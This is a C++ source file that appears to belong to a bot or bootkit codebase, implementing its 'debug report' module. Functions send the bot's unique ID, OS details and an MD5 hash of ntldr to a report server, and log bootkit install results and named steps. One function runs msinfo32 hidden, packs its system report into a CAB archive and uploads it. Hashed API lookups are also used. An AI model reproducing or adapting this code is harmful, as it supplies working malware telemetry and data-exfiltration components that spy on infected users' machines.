#include "DbgRpt.h"
#include <shlobj.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "Crypt.h"
#include "BotHTTP.h"
#include "BotUtils.h"
#include "dprint.h"
#include "CabPacker.h" 

//#ifdef DBGRPT_ENABLED
//PP_COMPILER_MESSAGE("DBGRPT_ENABLED is defined.");
//#else 
//PP_COMPILER_MESSAGE("DBGRPT_ENABLED is NOT defined.");
//#endif

void DbgRptSprintfA(char* buffer, const char* format, ...)
{
  va_list ptr;
  va_start(ptr, format);
  pwvsprintfA(buffer, format, ptr);
  va_end(ptr);
}

char* CalcNtldrMd5(char* Buffer, DWORD BufferSize)
{
	CHAR path[MAX_PATH];

	GetWindowsDirectoryA(path, MAX_PATH);
	path[3] = '\0';

	m_lstrcat(path, "ntldr");

	m_memset(Buffer, 0, BufferSize);
	char* md5 = CalcFileMD5Hash(path);

	PP_RETURNIF2(md5 == NULL, NULL);
	PP_RETURNIF2(BufferSize < 33, NULL);

	for (size_t i = 0; i < 16; i++)
	{
		char ByteBuffer[10];
		DbgRptSprintfA(ByteBuffer, "%02X", (BYTE)md5[i]);
		m_lstrcat(Buffer, ByteBuffer);
	}

	return Buffer;
}

void DebugReportStep1()
{
	CHAR BotUid[200];
	CHAR NtldrMd5Buffer[100];
	PCHAR OsInfo = NULL;
	PCHAR NtldrMd5 = NULL;

	m_memset(BotUid, 0, sizeof(BotUid));

	GenerateUid(BotUid);
	OsInfo = GetOSInfo();
	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "beforerbt");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "os", OsInfo);

	if (NtldrMd5 != NULL)
	{
		AddURLParam(Fields, "cs01", NtldrMd5);
	}

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	PP_DPRINTF(L"DebugReportStep1: sending url='%S'", URL);

	HTTP::Get(URL, NULL, NULL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
	MemFree(OsInfo);
}

void DebugReportStep2(DWORD BkInstallResult)
{
	CHAR BotUid[200];
	CHAR value[50];

	typedef int ( WINAPI *fwsprintfA)( PCHAR lpOut, PCHAR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	m_memset(BotUid, 0, sizeof(BotUid));
	m_memset(value, 0, sizeof(value));

	GenerateUid(BotUid);
	_pwsprintfA(value, "%u", BkInstallResult);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "bkinstall");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "val", value);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
	
	PP_DPRINTF(L"DebugReportStep2: sending url='%S'", URL);

	HTTP::Get(URL, NULL, NULL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}


//void DebugReportStep3()
//{
//	CHAR BotUid[200];
//	
//	m_memset(BotUid, 0, sizeof(BotUid));
//
//	GenerateUid(BotUid);
//
//	PStrings Fields = Strings::Create();
//	AddURLParam(Fields, "cmd", "rbt");
//	AddURLParam(Fields, "uid", BotUid);
//	AddURLParam(Fields, "val", "notrbt");
//
//	PCHAR Params = Strings::GetText(Fields, "&");
//	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
//	
//	PP_DPRINTF(L"DebugReportStep3: sending url='%S'", URL);
//
//	HTTP::Get(URL, NULL, NULL);
//
//	STR::Free(URL);
//	STR::Free(Params);
//	Strings::Free(Fields);
//}
//
//void DebugReportStep5()
//{
//	CHAR BotUid[200];
//	
//	m_memset(BotUid, 0, sizeof(BotUid));
//
//	GenerateUid(BotUid);
//
//	PStrings Fields = Strings::Create();
//	AddURLParam(Fields, "cmd", "dpl");
//	AddURLParam(Fields, "uid", BotUid);
//	AddURLParam(Fields, "val", "true");
//
//	PCHAR Params = Strings::GetText(Fields, "&");
//	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
//	
//	PP_DPRINTF(L"DebugReportStep5: sending url='%S'", URL);
//
//	HTTP::Get(URL, NULL, NULL);
//
//	STR::Free(URL);
//	STR::Free(Params);
//	Strings::Free(Fields);
//}
//
//void DebugReportStep6()
//{
//	CHAR BotUid[200];
//	
//	m_memset(BotUid, 0, sizeof(BotUid));
//
//	GenerateUid(BotUid);
//
//	PStrings Fields = Strings::Create();
//	AddURLParam(Fields, "cmd", "exe");
//	AddURLParam(Fields, "uid", BotUid);
//	AddURLParam(Fields, "val", "true");
//
//	PCHAR Params = Strings::GetText(Fields, "&");
//	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
//	
//	PP_DPRINTF(L"DebugReportStep6: sending url='%S'", URL);
//
//	HTTP::Get(URL, NULL, NULL);
//
//	STR::Free(URL);
//	STR::Free(Params);
//	Strings::Free(Fields);
//}

void DebugReportStepByName(const char* StepName)
{
	CHAR BotUid[200];
	
	m_memset(BotUid, 0, sizeof(BotUid));

	GenerateUid(BotUid);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "step");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "step", (PCHAR)StepName);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
	
	PP_DPRINTF(L"DebugReportStepByName: sending url='%S'", URL);

	HTTP::Get(URL, NULL, NULL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

void DebugReportUpdateNtldrCheckSum()
{
	CHAR BotUid[200];
	CHAR NtldrMd5Buffer[100];
	PCHAR NtldrMd5 = NULL;

	m_memset(BotUid, 0, sizeof(BotUid));

	GenerateUid(BotUid);
	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "csup");
	AddURLParam(Fields, "uid", BotUid);

	if (NtldrMd5 != NULL)
	{
		AddURLParam(Fields, "cs01", NtldrMd5);
	}

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	PP_DPRINTF(L"DebugReportUpdateNtldrCheckSumm: go to url='%S'", URL);
	HTTP::Get(URL, NULL, NULL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

PCHAR GetPathToMsInfo32()
{
	int FolderId = CSIDL_SYSTEM;
	const char* PathSuffix = "\\";

	OSVERSIONINFOEXA ver;

	m_memset(&ver, 0, sizeof(ver));
	ver.dwOSVersionInfoSize = sizeof(ver);

	if (!(BOOL)pGetVersionExA(&ver)) return NULL;

	if (ver.dwMajorVersion == 5)
	{
		FolderId = CSIDL_PROGRAM_FILES;
		PathSuffix = "\\Common Files\\Microsoft Shared\\MSInfo\\";
	}

	PCHAR Path = STR::Alloc(2 * MAX_PATH);
	m_memset(Path, 0, STR::Length(Path));

	pSHGetSpecialFolderPathA(NULL, Path, FolderId, false);
	m_lstrcat(Path, PathSuffix);
	m_lstrcat(Path, "msinfo32.exe");

	return Path;
}

void DebugReportSendSysInfo(PCHAR uid, PCHAR path)
{
	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "storefile");
	AddURLParam(Fields, "uid", (PCHAR)uid);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	PP_DPRINTF(L"DebugReportSendSysInfo: sending url='%S'", URL);

	PMultiPartData Data = MultiPartData::Create();

	MultiPartData::AddFileField(Data, "rep", path, NULL);
	bool Result = HTTP::Post(URL, Data, NULL);

	PP_DPRINTF(L"DebugReportSendSysInfo: HTTP::Post() result %d", Result);

	MultiPartData::Free(Data);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

void DebugReportCreateConfigReportAndSend()
{
	PCHAR MsInfoPath = NULL;
	PCHAR MsInfoParam = NULL;
	PCHAR ReportPath = NULL;
	PCHAR CabPath = NULL;

	do
	{
		// Получаем путь к msinfo32.exe
		MsInfoPath = GetPathToMsInfo32();
		PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: GetPathToMsInfo32() return '%S;", MsInfoPath);
		if (MsInfoPath == NULL) break;

		// Временный файл для отчета
		ReportPath = File::GetTempNameA();
		PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: GetTempNameA() for report file return '%S;", ReportPath);
		if (ReportPath == NULL) break;

		MsInfoParam = STR::Alloc(2 * MAX_PATH);
		if (MsInfoParam == NULL) break;

		PROCESS_INFORMATION pi;
		STARTUPINFO si;

		m_memset(&si, 0, sizeof(si));
		m_memset(&pi, 0, sizeof(pi));
		m_memset(MsInfoParam, 0, STR::Length(MsInfoParam));

		// Запускаем скрытно
		si.cb = sizeof(si);
		si.wShowWindow = SW_HIDE;
		
		m_lstrcat(MsInfoParam, " /report \"");
		m_lstrcat(MsInfoParam, ReportPath);
		m_lstrcat(MsInfoParam, "\"");
		
		PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: CreateProcess('%S', '%S')",
			MsInfoPath, MsInfoParam);

		BOOL process_result = CreateProcess(MsInfoPath, MsInfoParam, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

		PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: CreateProcess return %d.(ph=0x%X pid=%d)",
			process_result, pi.hProcess, pi.dwProcessId);

		if (process_result == FALSE) break;
		if (pi.hProcess == NULL) break;

		if (pi.hProcess != NULL)
		{
			PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: Waiting for msinfo32.");
			pWaitForSingleObject(pi.hProcess, INFINITE);
			pCloseHandle(pi.hProcess);
		}

		if (pi.hThread != NULL) pCloseHandle(pi.hThread);

		DWORD attributes = (DWORD)pGetFileAttributesA(ReportPath);
		PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: '%S' attibutes 0x%X.",
			ReportPath, attributes);
		if (attributes == INVALID_FILE_ATTRIBUTES) break;

		CabPath = File::GetTempNameA();
		HCAB CabHandle = CreateCab(CabPath);

		PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: CreateCab() return 0x%X.",
			CabHandle);

		if (CabHandle == NULL) break;

		AddFileToCab(CabHandle, ReportPath, "sysinfo.txt");
		CloseCab(CabHandle);

		char uid[200];

		PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: sending sysinfo report.");

		GenerateUid(uid);
		DebugReportSendSysInfo(uid, CabPath);

		PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: sysinfo report sent.");
	}
	while (false);

	if (ReportPath != NULL) pDeleteFileA(ReportPath);
	if (CabPath != NULL)    pDeleteFileA(CabPath);

	if (ReportPath != NULL) STR::Free(ReportPath);
	if (CabPath != NULL)    STR::Free(CabPath);
	if (MsInfoPath != NULL) STR::Free(MsInfoPath);

	PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: finished.");
}
